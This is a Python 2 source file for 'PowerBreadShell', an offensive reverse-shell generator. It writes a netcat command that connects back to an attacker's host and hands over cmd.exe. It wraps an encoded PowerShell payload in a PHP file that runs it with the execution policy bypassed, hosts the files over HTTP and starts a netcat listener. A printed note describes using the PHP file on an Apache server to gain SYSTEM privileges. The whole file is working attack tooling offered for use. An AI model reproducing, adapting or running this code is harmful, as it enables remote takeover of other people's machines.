# -*- coding: utf-8 -*-

import thread
import os
import time
import socket
import platform
import base64
import shutil

try:
	from colorama import *
	init()
	class color:
		red = Fore.RED
		reset = Fore.RESET
		ble = Fore.BLUE+"["+Fore.RESET+"+"+Fore.BLUE+"]"+Fore.RESET+" "
		adv = Fore.YELLOW+"["+Fore.RESET+"!"+Fore.YELLOW+"]"+Fore.RESET+" "
		cong = Fore.GREEN+"["+Fore.RESET+"+"+Fore.GREEN+"]"+Fore.RESET+" "
		error = Fore.RED+"["+Fore.RESET+"-"+Fore.RED+"]"+Fore.RESET+" "
except:
	class color:
		red = ''
		reset = ''
		ble = ''
		adv = "[!] "
		cong = "[+] "
		error = "[-] "
		
if platform.system() == 'Windows':
	print "The platform is good :: Windows"
elif platform.system() == 'Linux':
	print "Open new console and execute wine python PBS.py ..."
	quit()
else:
	print "Unknown platform for PFB.py :: %s" % (str(platform.system()))
	quit()
	
print "\n"
		
lhost = socket.gethostbyname(socket.gethostname())
lport = int(4444)
srvhost = lhost
srvport = int(80)
relisten = 'False'.title()
http = 'True'.title()
name = "Server.ps1"

current_path = os.getcwd()

list_mod = "generate.bat","nc.exe","index","Index\index.jpg"

for i in list_mod:
	if os.path.exists(i):
		print "%s ... True" % (str(i))
	else:
		print "%s ... False" % (str(i))
		time.sleep(2.5)
		quit()

index_content = """
<html>
	<head><title>No problem if I put my server here?</title></head>
	<body bgcolor=BLACK>
		<font color=WHITE size=5 face=Cursive>
			<h1>No problem if I put my server here?</h1>
			<hr />
			<br />
			<hr />
			<img src="index.jpg" width=500></img>
		</font>
	</body>
</html>
"""
	
def check_index():
	
	if not os.path.exists("Index"):
		os.mkdir("Index")
	if not os.path.exists("Index\\index.html"):
		print "Index file, not exist, creating ... %s" % (str(index_content))
		open("Index\\index.html","wb").write(index_content)
	else:
		with open("Index\\index.html","rb") as indexfile:
			if len(indexfile.read()) == 0:
				open("Index\\index.html","wb").write(index_content)
				print "Bytes 0, Writing content in the Index"
				print str(index_content)
			else:
				if indexfile.read() != index_content:
					open("index\\index.html", "wb").write(index_content)
	
def start_httphp():

	global srvhost
	global srvport
	
	if os.path.exists("HTTPFileServer.py"):
		os.remove("HTTPFileServer.py")

	proserve = """
# -*- coding: utf-8 -*-

from SimpleHTTPServer import *
from SocketServer import *
import os, socket

try:

	os.chdir("Index")

	Handler = SimpleHTTPRequestHandler
	httpd = TCPServer(("{0}", {1}), Handler)
	print "[!] HTTP Status :: Running ... http://{0}:{1}"
	httpd.serve_forever()
except socket.error:
	print "Error, Only one connection is allowed ..."
	quit()
except KeyboardInterrupt:
	quit()
except Exception as a:
	print "Error, %s" % (str(a))
	""".format(str(lhost),str(srvport))
	
	print "Generating HTTP Code :: %s" % str(proserve)
	
	open("HTTPFileServer.py","wb").write(proserve)
	
	os.system("python HTTPFileServer.py")

def listener(x, y):
	
	if y.lower() == 'true':
		print "Re-listen :: True"
		os.system("nc.exe -Lvvp "+x)
	elif y.lower() == 'false':
		print "Re-listen :: False"
		os.system("nc.exe -lvvp "+x)
	else:
		print color.error+"Error, Select True or False"
	
def generate(lhost, lport, srvhost, srvport, relisten, http, name):
	
	srvhost = "http://"+srvhost
	
	if not os.path.splitext(name)[1] == '.ps1':
		
		print color.adv+"Adjusted value :: %s To %s" % (str(name),str(name+".ps1"))
		name = name+".ps1"

	if os.path.exists("nc.exe"):
		print "Copying ... nc.exe => Index"
		shutil.copy("nc.exe","Index")
		print "Generating ... Payload :: %s" % (str(name))
		open("Index\\"+str(name), "wb").write(".\\nc.exe -d "+str(lhost)+" "+str(lport)+" -e cmd.exe")
	else:
		print color.error+"File not copy ..."
		quit()
	
	os.system("generate.bat "+str(srvhost)+":"+str(srvport)+" "+str(name))
	
	payload_not_encoded = open("pbs_payload_to_encode.ps1","rb").read()
	
	payload_encoded = base64.b64encode(payload_not_encoded.encode("UTF-16LE")).replace("+","%2b")
	
	if os.path.exists("Index\\"+str(name)):
		php_code = """
<?php
system("cmd.exe /C powershell.exe -WindowStyle 1 -ExecutionPolicy Bypass -EncodedCommand {0}");
?>
		""".format(str(payload_encoded))
		print color.cong+"Payload generated at :: %s :: %s Bytes :: %s" % (str(time.strftime("%I:%M:%S .%p - %d/%m/%Y")),str(len(open("Index\\"+str(name),"rb").read())),str(name))
		print color.ble+"Generating PHP Code :: Index.php in the folder Index :: %s" % (str(php_code))
		open("Index\\index.php","wb").write(str(php_code))
		if os.path.exists("Index\\index.php"):
			print color.cong+"PHP Code generated ..."
		else:
			print color.error+"Error, Generating php code"
			quit()
		if http.lower() == 'true':
			print "Starting HTTP Server ..."
			thread.start_new(start_httphp, ())
		elif http.lower() == 'false':
			pass
		else:
			print color.error+"Error, Select True or False"
		
		os.remove("pbs_payload_to_encode.ps1")
		
		print "Starting TCP Server ..."
		listener(str(lport), str(relisten))
		
		repeat = raw_input("Repeat operation? [Y-y] - [N-n], [Default: Y-y] > ")
		
		if not repeat:
			repeat = 'y'
			
		if repeat[0].lower() == 'y':
			pass
		elif repeat[0].lower() == 'n':
			quit()
		else:
			print color.error+"Error, Quiting ..."
			quit()
		
	else:
		print color.error+"Error, Payload not generated ..."

check_index()
	
print "\nImportant information:"
print "*********************\n"

print "Creator :: %s" % (str("DtxdF"))
print "Project :: %s" % (str("PowerBreadShell"))
print "WebSite :: %s" % (str("https://github.com/DtxdF"))

print "\nNote: to get user privileges: nt authority\system, it is necessary to move the php document generated by PowerBradShell to a server that can read it as apache, and run the php document from a browser through the server url to the php\n"
	
if not os.path.splitext(name)[1] == '.ps1':

	print color.adv+"Adjusted value :: %s To %s" % (str(name),str(name+".ps1"))
	name = name+".ps1"
		
print "\nPre-Settings:"
print "************\n"

print "Local Host/IP :: %s" % (str(lhost))
print "Local Port :: %s" % (str(lport))
print "SRVHOST :: %s - This variable needs to be adjusted from the source code" % (str(srvhost))
print "SRVPORT :: %s - This variable needs to be adjusted from the source code" % (str(srvport))
print "Re-listen :: %s" % (str(relisten))
print "HTTP :: %s" % (str(http))
print "Payload name :: %s" % (str(name))
print "\n"

while True:

	try:

		host = raw_input("Local Host/IP :: ")
		
		if not host: 
			host = lhost
			print "Local Host/IP :: %s" % (str(host))
			
		if host == '0.0.0.0':
			host = socket.gethostbyname(socket.gethostname())
			print "Local Host/IP :: 0.0.0.0 :: %s" % (str(host))
		
		port = raw_input("Local Port :: ")
		
		if not port:
			port = lport
			print "Local Port :: %s" % (str(port))
			
		tlf = raw_input("Re-listen - [True] or [False] :: ")
		
		if not tlf:
			tlf = relisten
			print "Re-listen :: %s" % (str(relisten))
			
		shttp = raw_input("HTTP - [True] or [False] :: ")
		
		if not shttp:
			shttp = 'True'.title()
			print "HTTP :: %s" % (str(shttp))
			
		pname = raw_input("Payload name :: ")
		
		if not pname:
			pname = name
			print "Payload name :: %s" % (str(pname))
			
		print "\nThe information is correct:"
		print "**************************\n"
		
		print "Local Host/IP :: %s" % (str(host))
		print "Local Port :: %s" % (str(port))
		print "SRVHOST :: %s - This variable needs to be adjusted from the source code" % (str(srvhost))
		print "SRVPORT :: %s - This variable needs to be adjusted from the source code" % (str(srvport))
		print "Re-listen :: %s" % (str(tlf))
		print "HTTP :: %s" % (str(shttp))
		print "Payload name :: %s" % (str(pname))
		print "\n"
		
		print "Write [Y-y] - [N-n]"
		
		yesorno = raw_input("> [Default: Y-y] > ")
		
		if not yesorno:
			yesorno = 'y'
		
		if yesorno[0].lower() == 'y':
			generate(host, port, srvhost, srvport, tlf, shttp, pname)
		elif yesorno[0].lower() == 'n':
			continue
		else:
			print color.red+"Select [Y-y] or [N-n]"
		
	except KeyboardInterrupt:
		print "Quiting ..."
		time.sleep(2.5)
		quit()
	except EOFError:
		print color.error+"Invalid key"
	except ValueError:
		print color.error+"The value is not int"
	except Exception as a:
		print color.error+str(a)